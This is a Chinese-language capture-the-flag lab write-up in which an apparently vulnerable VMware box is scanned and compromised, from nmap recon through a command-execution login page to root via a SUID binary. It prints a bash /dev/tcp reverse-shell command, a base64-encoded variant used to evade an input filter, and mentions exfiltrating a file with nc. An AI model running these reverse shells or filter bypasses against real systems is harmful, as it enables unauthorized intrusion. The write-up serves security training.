### 注：严禁恶意攻击及非法利用，由此所产生的一切后果均由读者自行承担！！！

### 1.信息收集

1）vmware虚拟靶场

![1658563020_62dba9ccc64d1d415380a.png!small?1658563011669](https://image.3001.net/images/20220723/1658563020_62dba9ccc64d1d415380a.png!small?1658563011669)

2）arp探测一下ip地址：

![1658563265_62dbaac16d92f82745527.png!small?1658563256279](https://image.3001.net/images/20220723/1658563265_62dbaac16d92f82745527.png!small?1658563256279)

3）使用工具nmap扫描获取系统版本或开放的端口：

![1658563449_62dbab794c34741cef6ec.png!small?1658563440313](https://image.3001.net/images/20220723/1658563449_62dbab794c34741cef6ec.png!small?1658563440313)

4）看到开放80和443端口时http服务，访问一下：

![1658563633_62dbac316a656bfd254d8.png!small?1658563624463](https://image.3001.net/images/20220723/1658563633_62dbac316a656bfd254d8.png!small?1658563624463)

![1658563714_62dbac828b279d78ccb5e.png!small?1658563705457](https://image.3001.net/images/20220723/1658563714_62dbac828b279d78ccb5e.png!small?1658563705457)

5）bad request 400，请求参数错误，nmap扫描的时候，发现有两个DNS，添加到host文件中：

![1658565308_62dbb2bc24ad3aeebabc7.png!small?1658565299598](https://image.3001.net/images/20220723/1658565308_62dbb2bc24ad3aeebabc7.png!small?1658565299598)

6）绑定域名后，就可以访问了：

![1658565491_62dbb3735c0f8aacd09b6.png!small?1658565482540](https://image.3001.net/images/20220723/1658565491_62dbb3735c0f8aacd09b6.png!small?1658565482540)![1658565594_62dbb3da894e88bdc05d0.png!small?1658565585427](https://image.3001.net/images/20220723/1658565594_62dbb3da894e88bdc05d0.png!small?1658565585427)

### 2.目录探测

1）扫一下目录：

![1658567798_62dbbc76c83f864962dbd.png!small?1658567789761](https://image.3001.net/images/20220723/1658567798_62dbbc76c83f864962dbd.png!small?1658567789761)

2）发现登陆页面：

![1658568017_62dbbd517647d612920d1.png!small?1658568008407](https://image.3001.net/images/20220723/1658568017_62dbbd517647d612920d1.png!small?1658568008407)

3）再扫一下443：

![1658568405_62dbbed50833e399dc43b.png!small?1658568395898](https://image.3001.net/images/20220723/1658568405_62dbbed50833e399dc43b.png!small?1658568395898)

4）访问一下index.html和robots.txt发现有测试注释：

![1658568682_62dbbfea3feab310a278c.png!small?1658568673070](https://image.3001.net/images/20220723/1658568682_62dbbfea3feab310a278c.png!small?1658568673070)![1658568815_62dbc06f937ddd2393053.png!small?1658568806546](https://image.3001.net/images/20220723/1658568815_62dbc06f937ddd2393053.png!small?1658568806546)

### 3.信息利用

1）发现管理员账号，密码使用了testdata.txt加密算法：

![1658569840_62dbc47053d12f5bd3733.png!small?1658569831253](https://image.3001.net/images/20220723/1658569840_62dbc47053d12f5bd3733.png!small?1658569831253)

2）输入tsetdata.txt发现一篇文章：

![1658570088_62dbc568bf6e252b374d5.png!small?1658570079631](https://image.3001.net/images/20220723/1658570088_62dbc568bf6e252b374d5.png!small?1658570079631)

3）回到前面80端口访问到一些16进制字符，结合以上得到的信息加密传输遗留，大概是密钥：

![1658570298_62dbc63a9799ad9deab5c.png!small?1658570289506](https://image.3001.net/images/20220723/1658570298_62dbc63a9799ad9deab5c.png!small?1658570289506)

4）对以上密钥进行转码，每段就会有一个重复：

![1658573896_62dbd448e04c86781e6b9.png!small?1658573887779](https://image.3001.net/images/20220723/1658573896_62dbd448e04c86781e6b9.png!small?1658573887779)

### 4.内网渗透

1）尝试SSH连接，权限拒绝：

![1658574577_62dbd6f1da59211412411.png!small?1658574568643](https://image.3001.net/images/20220723/1658574577_62dbd6f1da59211412411.png!small?1658574568643)

2）以上扫描还有一个登录页面，尝试一下，登录成功，提示命令可执行：

![1658574785_62dbd7c1c4afded8c5f9b.png!small?1658574776537](https://image.3001.net/images/20220723/1658574785_62dbd7c1c4afded8c5f9b.png!small?1658574776537)

3）可执行CLI命令那就好办了，输入反弹shell命令，禁止远程连接：

指令：bash -i >& /dev/tcp/kali地址/侦听端口号 0>&1

![1658576279_62dbdd9714f7de3247943.png!small?1658576269866](https://image.3001.net/images/20220723/1658576279_62dbdd9714f7de3247943.png!small?1658576269866)

4）尝试base64编码绕过：

![1658578057_62dbe489836e044abb780.png!small?1658578048230](https://image.3001.net/images/20220723/1658578057_62dbe489836e044abb780.png!small?1658578048230)

5）转码后输入，再次提交，最多能输入100个字符，连接成功：

指令：bash -c
'{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTA0LzI1MDAxIDA+JjE=}|{base64,-d}|{bash,-i}'
//管道应字符超出空格删掉了

![1658577948_62dbe41c9e8b4de81b661.png!small?1658577939407](https://image.3001.net/images/20220723/1658577948_62dbe41c9e8b4de81b661.png!small?1658577939407)

![1658578008_62dbe4582eea6c8be96cd.png!small?1658577998842](https://image.3001.net/images/20220723/1658578008_62dbe4582eea6c8be96cd.png!small?1658577998842)

6）发现是个普通用户，查看是否存在python环境，切换交互式shell：

![1658578532_62dbe664d2c5d35cc5187.png!small?1658578525186](https://image.3001.net/images/20220723/1658578532_62dbe664d2c5d35cc5187.png!small?1658578525186)

### 5.提权

1）查询具有uid标识的文件发现pkexec提权漏洞：

![1658580099_62dbec83e3d21e423551e.png!small?1658580090579](https://image.3001.net/images/20220723/1658580099_62dbec83e3d21e423551e.png!small?1658580090579)

  

2）github搜索pkexec下载脚本到kali，开启http服务访问下载，没有权限：

![1658581436_62dbf1bc1d1d68b08ff7b.png!small?1658581426975](https://image.3001.net/images/20220723/1658581436_62dbf1bc1d1d68b08ff7b.png!small?1658581426975)

3）以上查询uid标识的文件/usr/bi/reset_root查看一下，一堆乱码：

![1658581949_62dbf3bd7bdf65d6b6199.png!small?1658581940242](https://image.3001.net/images/20220723/1658581949_62dbf3bd7bdf65d6b6199.png!small?1658581940242)

4）输入文件路径执行，提示触发失败：

![1658583718_62dbfaa69c0334d29238b.png!small?1658583709212](https://image.3001.net/images/20220723/1658583718_62dbfaa69c0334d29238b.png!small?1658583709212)

5）使用nc将文件传出到kali：

![1658582408_62dbf588e9c549829dc9c.png!small?1658582399717](https://image.3001.net/images/20220723/1658582408_62dbf588e9c549829dc9c.png!small?1658582399717)

6）然后kali这边用strace解析一下，缺少这三个文件执行不了：

![1658583397_62dbf96543564004b4e27.png!small?1658583387934](https://image.3001.net/images/20220723/1658583397_62dbf96543564004b4e27.png!small?1658583387934)

7）在目标机上创建这三个文件在执行，成功拿到root密码（Earth），su切换到root，提权成功：

![1658584172_62dbfc6c105cbfe40d06e.png!small?1658584162695](https://image.3001.net/images/20220723/1658584172_62dbfc6c105cbfe40d06e.png!small?1658584162695)

![1658584447_62dbfd7f0ff2b9731673f.png!small?1658584437637](https://image.3001.net/images/20220723/1658584447_62dbfd7f0ff2b9731673f.png!small?1658584437637)

